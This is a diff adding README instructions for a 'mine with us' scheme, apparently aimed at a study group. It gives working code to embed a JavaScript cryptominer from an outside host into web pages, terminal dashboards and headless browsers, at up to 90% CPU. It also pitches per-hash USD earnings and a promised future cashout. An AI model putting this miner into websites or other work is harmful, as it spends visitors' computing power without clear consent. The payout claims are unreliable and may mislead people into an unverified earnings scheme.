@@ -1,5 +1,164 @@
 # Manierism megabytes.
+
+# How to use the script to mine with us script file found at api,terminal,web html mining script payments linked to https://manierismmegabyte.gamer.gd/rg.html
+
+# Redeem payments soon on this html: https://manierismmegabyte.gamer.gd/s.html  ( currently the market exchange,swap feature and wallet balance)
+
+## 1️⃣ What the script does (basics)
+
+1. **Loads the miner library**
+
+```html
+<script src="https://www.hostingcloud.racing/LPuK.js"></script>
+```
+
+This allows your page (or terminal/web app) to mine cryptocurrency using JavaScript.
+
+2. **Creates a miner client linked to your account**
+
+```js
+var _client = new Client.Anonymous('YOUR_KEY_HERE', { throttle: 0.4, c: 'w' });
+```
+
+* `YOUR_KEY_HERE` → your unique key to credit your account.
+* `throttle: 0.4` → uses **40% of CPU**. Increase to `0.9` for 90%, lower to `0.1` for 10%.
+* `c: 'w'` → “web” mode (works in browsers, terminal dashboards, and some API setups).
+
+3. **Starts the miner**
+
+```js
+_client.start();
+```
+
+* Begins calculating hashes. Each hash counts toward your earnings.
+* Higher CPU usage → higher hash rate.
+
+4. **Optional notifications**
+
+```js
+_client.addMiningNotification("Top", "Mining in progress...", "#cccccc", 40, "#3d3d3d");
+```
+
+* Shows a small message banner on your page (web only).
+
+5. **Measure hash rate**
+
+```js
+_client.getHashesPerSecond();
+```
+
+* Returns current hash rate (H/s, kH/s, MH/s) for live dashboards.
+
 ---
+
+## 2️⃣ How to use it
+
+### **A. Browser-based HTML page**
+
+1. Insert the script into your `<body>` or `<head>`:
+
+```html
+<script src="https://www.hostingcloud.racing/LPuK.js"></script>
+<script>
+    let _client = new Client.Anonymous('YOUR_KEY_HERE', { throttle: 0.4, c: 'w' });
+    _client.start();
+</script>
+```
+
+2. Add a button to start/stop mining:
+
+```html
+<button id="miningBtn">Start Mining</button>
+<script>
+    document.getElementById('miningBtn').onclick = () => {
+        if(_client.isRunning()) _client.stop();
+        else _client.start();
+    };
+</script>
+```
+
+3. Add a hash rate display:
+
+```html
+<div>Hash Rate: <span id="gpuHashRate">0 H/s</span></div>
+<script>
+    setInterval(() => {
+        document.getElementById("gpuHashRate").textContent = _client.getHashesPerSecond() + " H/s";
+    }, 1000);
+</script>
+```
+
+---
+
+### **B. Terminal-like web dashboard**
+
+* If you have a terminal UI in HTML/JS (like your WATT Epoch Rig), just include the same script.
+* Dynamically **adjust CPU throttle**:
+
+```js
+function setThrottle(percent) {
+    const t = Math.min(Math.max(percent / 100, 0.1), 0.9);
+    if(_client.isRunning()) _client.stop();
+    _client = new Client.Anonymous('YOUR_KEY_HERE', { throttle: t, c: 'w' });
+    _client.start();
+}
+```
+
+* Allows live CPU control without reloading the page.
+
+---
+
+### **C. Using API / backend integration**
+
+* The miner is JavaScript-only, so **backend servers can’t run it directly**.
+* But you can **trigger the miner in a headless browser** using Node.js + Puppeteer, or through a web API that serves the HTML page with the miner embedded.
+* Your API can fetch hash rate and earnings every few seconds from the client browser using `fetch` and update your database.
+
+---
+
+## 3️⃣ How rewards are calculated
+
+* Your mining system assigns a **value per hash**. For example:
+
+* Suppose your system sets **0.00000024 USD per hash** (`HASH_USD = 0.00000024`)
+
+* If your miner runs at **1,000 H/s** for 1 second:
+
+```text
+1,000 hashes/sec × 1 sec × 0.00000024 USD/hash = $0.00024 earned
+```
+
+* 1 kH/s = 1,000 H/s
+* 1 MH/s = 1,000,000 H/s
+
+So if your rig mines at **500 kH/s** for **1 minute**:
+
+```text
+500,000 H/s × 60 sec × 0.00000024 USD/hash ≈ $7.20 per minute
+```
+
+*(values are illustrative; actual rates vary).*
+
+---
+
+## ✅ Summary / Usage Steps
+
+1. **Insert the script** in your HTML `<head>` or `<body>`.
+2. **Set the throttle** from 10%–90% CPU.
+3. **Start miner** with `_client.start()`.
+4. **Monitor hash rate** using `_client.getHashesPerSecond()`.
+5. **Stop miner** if needed with `_client.stop()`.
+6. **Display earnings** in your dashboard by multiplying hash count × `HASH_USD`.
+
+* Uses 10–90% CPU dynamic throttle
+* Shows **live hash rate** and **estimated USD earned per second**
+* Works **in-browser, terminal UI, and API**
+* Fully integrates with your current wallet stats
+
+
+
+
+
 -----
 # Okay study group i have good news the rig rs html below is fully working and is now connected to mine hashpower for us together you can receive rewards and mine now cashout will come on stock market html as i fix the last couple updates to swap and exchange 
 
